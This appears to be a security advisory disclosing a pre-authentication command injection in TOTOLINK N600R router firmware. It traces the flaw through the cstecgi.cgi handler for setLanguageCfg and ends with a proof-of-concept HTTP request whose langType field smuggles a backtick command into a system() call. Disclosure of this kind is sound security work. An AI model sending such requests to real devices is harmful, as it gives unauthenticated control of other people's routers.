# Information



Vendor of the products:  Shenzhen Shengshi Zhongtang Technology Co., Ltd..(TOTOLINK)

Vendor's website:  [TOTOLINK](https://totolink.tw/)

Reported by:  Wang Jinshuai(3265296623@qq.com),   Tang Bingheng(2640807724@qq.com)

Affected products:  TOTOLINK N600R

Affected firmware version:  V4.3.0cu.7866_B20220506

Firmware download address:  [N600R 雙倍飆速無線分享器｜TOTOLINK 台灣](https://totolink.tw/support_view/N600R)



# Overview

The vulnerability resides in the /web_cste/cgi-bin/cstecgi.cgi binary. The sub_4159F8 routine obtains user-supplied input from the frontend and concatenates it into the argument of the system() call without proper validation or sanitization, resulting in a pre-authentication command injection flaw. An unauthenticated attacker can submit specially crafted payloads to execute arbitrary system commands.



# Vulnerability details

Through analysis of the /web_cste/cgi-bin/cstecgi.cgi binary that provides the device’s web service, a pre-authentication command injection vulnerability was identified. Around line 260 in main, the program matches the user input against the string setting/setLanguageCfg, and upon a match, execution branches to approximately line 340.

![image-20250828151423665](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508281514696.png)

It then consults the set_handle_t dispatch table to resolve the corresponding handler based on the matched value and invokes it.

![image-20250828151749581](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508281517612.png)

The setLanguageCfg entry resolves to the handler at sub_415840.

![image-20250828152903482](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508281529503.png)

At approximately line 405 in main, the resolved handler is retrieved and invoked.

![image-20250828152807766](https://b55t4ck.oss-cn-shenzhen.aliyuncs.com/image/202508281528787.png)

The variable Var receives client-supplied data via the langType parameter and is directly concatenated into v5 using sprintf(). Due to the lack of strict input validation, an attacker can leverage backtick-based command substitution to execute arbitrary commands.

![image-20250826153724887](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508272130214.png)



# POC

```python
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 73
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/login.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
"topicurl":"setting/setLanguageCfg",
"langType":"`ls -l > ../123.txt`"
}
```

# Effect Demonstration

![image-20250826153644908](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508272130729.png)



![image-20250826153629484](https://mono7s.oss-cn-wuhan-lr.aliyuncs.com/image/202508272130868.png)